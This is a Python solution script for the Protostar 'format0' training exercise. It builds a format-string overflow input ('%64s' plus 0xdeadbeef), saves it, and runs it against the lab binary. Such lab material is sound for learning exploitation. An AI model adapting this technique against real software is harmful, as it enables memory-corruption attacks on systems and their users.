from subprocess import PIPE, call
import os.path
import sys
import struct



# ============================= make_exploit =============================
def make_exploit():
    """This is our BOF input"""

    padding = b'%64s'
    target = struct.pack('I', 0xdeadbeef)
    exploit = (padding + target)
    return exploit


# ============================= print_exploit =============================
def print_exploit(exploit):
    """Prints a representation of the exploit input"""

    cont = 0
    sys.stdout.write('='*20 + 'Exploit' + '='*20 + '\n')
    while cont < len(exploit):
        sys.stdout.write('{0:<8}: '.format(hex(cont) ))
        sys.stdout.write(' '.join( [x for x in exploit[cont:cont+16]] ) + '\n')
        cont += 0x10
    sys.stdout.write('='*47 + '\n\n')


# ============================= save_exploit =============================
def save_exploit(exploit_filename, exploit, _print=False):
    """Saves exploit input data to a file at the same directory of this script (__file__)"""

    if _print:
        print('\n[X] Saving: {0}...\n'.format(exploit_filename))
        print_exploit(exploit)

    dir_path = os.path.dirname('./' + sys.argv[0])
    abs_path_exploit = dir_path + '/' + exploit_filename
    with open(abs_path_exploit, 'wb') as exploit_file:
        exploit_file.write(exploit)


# ============================= evil =============================
def evil(exploit, level_path):
    """call level_path and run the exploit"""
    
    print('\n[X] Exploiting: {0}\n'.format(level_path))

    cli = level_path + ' ' + exploit
    call(cli, shell=True, stdin=PIPE)


# ============================= S T A R T =============================
if __name__ == '__main__':
    exploit_filename = 'exploit_format0'
    level_path = '/opt/protostar/bin/format0'
    try:
        if sys.argv[1] == '-s' or sys.argv[1] == '--save':
            exploit = make_exploit()
            save_exploit(exploit_filename, exploit, True)
        else:
            print('Error: bad option.\
            \n\n\trun:\n\t{0} [-s | --save]\    # to save exploit file\n'.format(sys.argv[0]))

            print('\tor just run: \n\t{0}    # to exploit `{1}`\n'.format(sys.argv[0], level_path))
    except:
        exploit = make_exploit()
        save_exploit(exploit_filename, exploit, True)
        evil(exploit, level_path)
